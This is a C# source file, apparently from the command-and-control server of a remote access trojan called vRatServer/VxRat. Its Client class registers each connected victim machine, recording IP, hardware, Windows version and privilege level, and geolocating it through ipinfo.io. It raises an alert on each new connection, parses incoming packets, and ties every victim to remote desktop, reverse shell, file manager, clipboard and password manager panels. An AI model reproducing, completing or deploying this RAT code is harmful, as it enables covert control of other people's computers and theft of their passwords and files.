using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using vRatServer.Forms;

namespace vRatServer.Classes
{
    public class Client
    {
        public static int img_id = 0;
        public string Name = string.Empty;
        public string gpu = string.Empty;
        public string WindowsVers = string.Empty;
        public string privilege = string.Empty;
        public string cpu_arch = string.Empty;
        public RemoteDesktop cf = null;
        public ReverseShellform rsf = null;
        public FileManagerForm fmf = null;
        public TaskManager tkm = null;
        public Forms.Clipboard clpd = null;
        public PasswordManager pam = null;
        public OnDisconnect ondsc = null;

        public List<string> screens;
        public int ScreenX;
        public int ScreenY;
        public Mutex SocketM;
        string country_code = null;
        public string ip { get; set; }
        public Socket client { get; set; }
        public ListViewItem lvi;
        public List<ListViewItem> testfileslist=new List<ListViewItem>();

        void GetCountry()
        {
            using (var client = new HttpClient())
            {
                var response = client.GetAsync("https://ipinfo.io/"+ip+"/country").Result;
                var responseString = response.Content.ReadAsStringAsync().Result;
                country_code = responseString.ToLower();
                country_code.Trim();

                country_code = country_code.Replace("\n", "");
                // MessageBox.Show(country_code);
            }
        }
        byte[] getimage()
        {

            string flag = "flags\\" + country_code + ".png";
            if (country_code.IndexOf("error") != -1) { flag = "flags\\unk.png"; }
            try
            {
                byte[] file = File.ReadAllBytes(flag);
                return file;
            }
            catch (Exception e) { MessageBox.Show(e.Message); }

            return null;

        }
        public void add_client()
        {
            byte[] imageb = getimage();
            if (imageb == null) { }
            MemoryStream _ms = new MemoryStream(imageb);

            globals.imageList.ImageSize = new Size(30, 25);
            Image i = Image.FromStream(_ms);

            globals.imageList.Images.Add(i);
            // bind listview


            string[] det = { ip, Name, gpu, cpu_arch,WindowsVers,privilege };
            lvi = new ListViewItem(det);
            lvi.ImageIndex = img_id;
            img_id += 1;
            lvi.Tag = this;
            //lvi.ImageKey = ip;

            Program.f1.Invoke((MethodInvoker)delegate {
                Program.f1.updateCount(true);
            Program.f1.listView1.SmallImageList = globals.imageList;

            Program.f1.n.Icon = SystemIcons.Information;
            Program.f1.n.Visible = true;
                Program.f1.n.BalloonTipTitle = "VxRat";
                Program.f1.n.ShowBalloonTip(3000, ip, Name+"\n"+ WindowsVers, ToolTipIcon.Info);
                Task.Delay(4000).ContinueWith(_ => Program.f1.n.Visible = false);
                Program.f1.listView1.Items.Add(lvi);

            });
        }

        private void N_DoubleClick(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        public Client(Socket s)
        {
            SocketM = new Mutex();
            client = s;
            screens = new List<string>();
            ip = client.RemoteEndPoint.ToString().Split(':')[0];
            GetCountry();



        }

        public void recv_data()
        {
            int len;

            byte[] id = new byte[8];
            byte[] buffer = new byte[4];
            byte[] data_buffer = new byte[5000000 + 100];
            byte[] com = new byte[2];
            int size = 0;
            while (client.Connected)
            {
                try
                {
                    {
                        if (globals.ReceiveBytesFromSocket(this.client, 4, ref buffer) == -1) { break; }//disconnected

                        len = globals.ByteArrayToInt(buffer);
                        if (len > data_buffer.Length) { break; }

                        if (globals.ReceiveBytesFromSocket(this.client, 8, ref id) == -1) { break; }
                        if (id == null)
                        {
                            break;//disconnected
                        }

                        if (globals.ReceiveBytesFromSocket(this.client, 1, ref com) == -1) { break; }
                        if (id == com)
                        {
                            break;//disconnected
                        }
                        //data_buffer = null;
                        if (len >= 1)
                        {
                            size = globals.ReceiveBytesFromSocket(this.client, len, ref data_buffer);
                            if (size == -1) { break; }

                        }
                        

                        new ClientPacket(id, com[0], ref data_buffer, len, this).packetHandler();
                        //GC.Collect();


                    }

                }
                catch (Exception e) {  break; }
            }


            client.Close();
            Disconnected();


        }
        private void Disconnected()
        {

            Program.f1.Invoke((MethodInvoker)delegate {
                try
                {
                    lvi.Remove();
                    Program.f1.updateCount(false);
                }
                catch (Exception) { }
                

            });

        }


    }
}
